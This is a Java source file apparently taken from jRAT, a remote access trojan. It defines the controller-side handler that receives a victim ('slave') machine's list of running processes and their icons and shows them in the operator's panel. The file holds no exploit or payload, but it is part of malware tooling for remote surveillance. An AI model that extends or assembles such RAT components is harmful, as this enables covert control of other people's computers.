package jrat.module.process;

import jrat.common.ProcessData;
import jrat.controller.Slave;
import jrat.controller.packets.incoming.AbstractIncomingPacket;
import jrat.module.process.ui.PanelProcesses;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;

public class PacketProcessData extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		try {
			PanelProcesses frame = (PanelProcesses) slave.getPanel(PanelProcesses.class);

			int count = slave.readByte();

			String[] data = new String[count];

			for (int i = 0; i < count; i++) {
				data[i] = slave.readLine();
			}
			
			BufferedImage icon = null;
			
			if (slave.readBoolean()) {
				byte[] bIcon = new byte[slave.readInt()];
                slave.readFully(bIcon);
				icon = ImageIO.read(new ByteArrayInputStream(bIcon));
			}
			
			ProcessData processData = new ProcessData(data, icon);

			if (frame != null) {
				frame.getModel().addRow(new Object[] { processData });
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
